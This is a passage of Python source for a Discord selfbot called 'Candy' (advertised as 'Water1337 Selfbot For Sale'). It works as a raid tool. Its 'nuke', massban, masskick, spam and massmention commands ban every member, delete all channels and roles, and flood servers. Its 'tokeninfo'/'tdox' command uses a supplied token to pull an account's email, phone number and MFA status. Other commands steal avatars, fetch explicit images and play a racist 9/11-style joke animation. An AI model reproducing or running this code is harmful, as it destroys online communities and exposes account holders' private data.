    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')


@Candy.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "Water Owns You"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@Candy.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    embed = discord.Embed(color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_author(name="Cotton Candy Geoip", url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    embed.set_thumbnail(url=Candy.user.avatar_url)
    embed.set_image(url='https://media1.tenor.com/images/b7f411656a42312f1342b82d6a72a291/tenor.gif')
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            embed.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=embed)
    

@Candy.command(aliases=["del"])
async def gping(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=1)


    
@Candy.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.BLUE}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down ({r})', delete_after=3)
        else:
            await ctx.send(f'Website is operational ({r})', delete_after=3)


@Candy.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Candy_tweet.png"))
            except:
                await ctx.send(res['message'])

@Candy.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])


@Candy.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Candy_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Candy_fry.png"))
        except:
            await ctx.send(res['message'])


@Candy.command(aliases=["blurp"])
async def blurpify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Candy_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Candy_blurpify.png"))
        except:
            await ctx.send(res['message'])


@Candy.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Candy_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])

@Candy.command(aliases=["cf"]) 
async def coinflip(ctx):
        await ctx.message.delete()
        randomlist = ["***`Heads`***","***`Tails`***",]
        await ctx.send(random.choice(randomlist))

@Candy.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@Candy.command(aliases=["reversesearch", "anticatfish", "catfish"])
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.BLUE}{e}" + Fore.RESET)


@Candy.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@Candy.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)


@Candy.command(aliases=['1337'])
async def _1337_speak(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
        .replace('E', '3').replace('i', '!').replace('I', '!') \
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    em = discord.Embed(description=(text))
    em.set_author(name=ctx.author.display_name, url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    em.set_thumbnail(url=Candy.user.avatar_url)
    em.set_footer(text="I'm A Spooky Hacker")
    await ctx.send(embed=em)


@Candy.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.BLUE}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
            r = requests.get(user.avatar_url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                await Candy.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.BLUE}{e}" + Fore.RESET)



@Candy.command()
async def wyr(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f"{qa}\nor\n{qb}", color=discord.Color(random.randint(0, 0xffffff)))
    em.set_author(name=f"Candy Wyr", url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    em.set_thumbnail(url=Candy.user.avatar_url)
    em.set_footer(text="Candy Would You Rather")
    message = await ctx.send(embed=em)
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")



@Candy.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): 
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(description=f"8{dong}D", color=discord.Color(random.randint(0, 0xffffff)))
    em.set_author(name=f"{user}'s Dick size", url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    em.set_thumbnail(url=Candy.user.avatar_url)
    em.set_footer(text="How Big is Your Dong")
    await ctx.send(embed=em)


@Candy.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@Candy.command()
async def nuke(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="Water1337 Selfbot For Sale",
            reason="Water1337 Selfbot For Sale",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Candy")
    for _i in range(250):
        await ctx.guild.create_role(name="Water#1337", color=RandomColor())


@Candy.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="L Water#1337 Selfbot For Sale")
        except:
            pass


@Candy.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@Candy.command()
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="L Water#1337 Selfbot For Sale")
        except:
            pass


@Candy.command()
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Water1337 Selfbot For Sale", color=RandomColor())
        except:
            return


@Candy.command(aliases=["masschannels"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="Water1337 Selfbot For Sale")
        except:
            return


@Candy.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@Candy.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass


@Candy.command()
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@Candy.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)


@Candy.command(name='get-color', aliases=['color'])
async def _get_color(ctx, *, color: discord.Colour):
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'{str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em)


@Candy.command(aliases=['rainbowrole'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break


@Candy.command()
async def joke(ctx):
    await ctx.message.delete()
    await ctx.send("who", delete_after=10)
    await asyncio.sleep(1)
    await ctx.send("asked")


@Candy.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    em = discord.Embed(description=f"`{int(ping)} ms`", color=discord.Color(random.randint(0, 0xffffff)))
    em.set_author(name=f"Candy User Pinger", url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    em.set_thumbnail(url=Candy.user.avatar_url)
    em.set_footer(text="Candy User Ping")
    await ctx.send(embed=em)
    asyncio.sleep(5)
    await ctx.send(",geoip ./")

@Candy.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)


@Candy.command()
async def ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'There is a good chance',
        'Yes, This is valid'
    ]
    answer = random.choice(responses)
    embed = discord.Embed(color=discord.Color(random.randint(0, 0xffffff)))
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_author(name=f"Candy 8Ball", url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    embed.set_thumbnail(url=Candy.user.avatar_url)
    embed.set_footer(text="May The Odds be Ever In Your Favor")
    await ctx.send(embed=embed)


@Candy.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        print(list(ctx.guild.members))
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)


@Candy.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))


@Candy.command()
async def serverpfp(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)


@Candy.command()
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)


@Candy.command(name='first-message', aliases=['fm'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content, color=discord.Color(random.randint(0, 0xffffff)))
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)


@Candy.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@Candy.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@Candy.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass
        

@Candy.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Candy.command_prefix = str(prefix)


@Candy.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n','o', 'p', 'q', 'r', 's', 't', 'u',
           'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)


@Candy.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,CAD')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    cad = r['CAD']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`\nCAD: `{str(cad)}$`', color=discord.Color(0xc29e29))
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@Candy.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")


@Candy.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")

#Can Get Termed 
@Candy.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@Candy.command(aliases=["stopcycle"])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@Candy.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Candy.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()


@Candy.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in Candy.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()


@Candy.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in Candy.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()


@Candy.command()
async def changeregion(ctx, amount):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        print()


@Candy.command(aliases=["kgc"])
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)


@Candy.command(aliases=["gcleave"])
async def leavegc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


@Candy.command(aliases=["mr"])
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


@Candy.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"dog.png"))
    except:
        await ctx.send(link)


@Candy.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"cat.png"))
    except:
        await ctx.send(link)


@Candy.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['url'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"sadcat.png"))
    except:
        await ctx.send(link)


@Candy.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r["image"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"fox.png"))
    except:
        await ctx.send(link)


@Candy.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"anal.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def catgirls(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/gecg")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"gecg.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def kemono(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kemonomimi")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"kemonomimi.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Candy_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command(aliases=["bj"])
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"bj.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        asyncio.sleep(5)
    await ctx.send(",geoip ./")


@Candy.command(aliases=["neko"])
async def lewdneko(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"neko.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        asyncio.sleep(5)
    await ctx.send(",geoip ./")


@Candy.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
